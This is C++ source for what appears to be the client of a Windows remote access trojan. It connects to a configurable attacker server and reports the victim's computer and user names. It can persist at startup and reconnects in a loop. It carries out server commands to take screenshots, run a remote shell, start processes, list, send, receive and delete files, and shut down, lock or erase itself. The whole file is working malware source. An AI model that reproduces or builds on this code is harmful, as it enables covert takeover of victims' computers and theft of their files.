#include <iostream>
#include <unistd.h>
#include <windows.h>
#include <fstream>
#include <vector>
#include <algorithm>
#include <dirent.h>

const std::string SERVER = "SERVER IP HERE";
const int PORT = 5005;

std::string username = getenv("username");
std::string computer = getenv("computername");
std::string appdata = getenv("appdata");
std::string command, data;

SOCKET objSocket;
char buffer[8192];
const int TIMEOUT = 150000;
bool startup = false;

#include "RegisterStartup.cpp"
#include "VBSMessageBox.cpp"
#include "CaptureScreenshot.cpp"
#include "ChangeWallpaper.cpp"
#include "StartProcess.cpp"
#include "RemoteCMD.cpp"
#include "ViewFiles.cpp"
#include "SendFile.cpp"
#include "ReceiveFile.cpp"
#include "DeleteFile.cpp"
#include "DeleteSelf.cpp"

int main()
{
    WSADATA wsdata;
    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) return EXIT_FAILURE;

    objSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (objSocket == SOCKET_ERROR) return EXIT_FAILURE;

    sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(SERVER.data());
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));

    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket);
        WSACleanup();
        main();
    }
    if (startup) RegisterStartup(__FILE__);
    send(computer + "|" + username);

    std::cout << "Connected to Server" << std::endl;
    while (true)
    {
        int server = recv(objSocket, buffer, sizeof(buffer), 0);
        if (server == SOCKET_ERROR || server == NO_BYTES_IN_BUFFER) {
            std::cout << "Lost Connection to Server" << std::endl;
            closesocket(objSocket);
            WSACleanup();
            main();
        
        } command = buffer;

        if (command == "terminate") {
            closesocket(objSocket);
            WSACleanup();
            exit(0);
		}
        else if (command == "msgbox") {
            VBSMessageBox();
        }
        else if (command == "screenshot") {
            CaptureScreenshot();
        }
        else if (command == "wallpaper") {
            ChangeWallpaper();
        }
        else if (command == "process") {
            StartProcess();
        }
        else if (command == "remote") {
            RemoteCMD();
        }
        else if (command == "shutdown") {
            system("shutdown /p");
        }
        else if (command == "restart") {
            system("restart /r");
        }
        else if (command == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (command == "directory") {
            getcwd(buffer, FILENAME_MAX);
            send(buffer);
        }
        else if (command == "files") {
            ViewFiles();
        }
        else if (command == "send") {
            SendFile();
        }
        else if (command == "receive") {
            ReceiveFile();
        }
        else if (command == "delfile") {
            DeleteFile();
        }
        else if (command == "delself") {
            DeleteSelf();
        }

        memset(buffer, 0, sizeof(buffer));
        command.clear();
        data.clear();
    }
}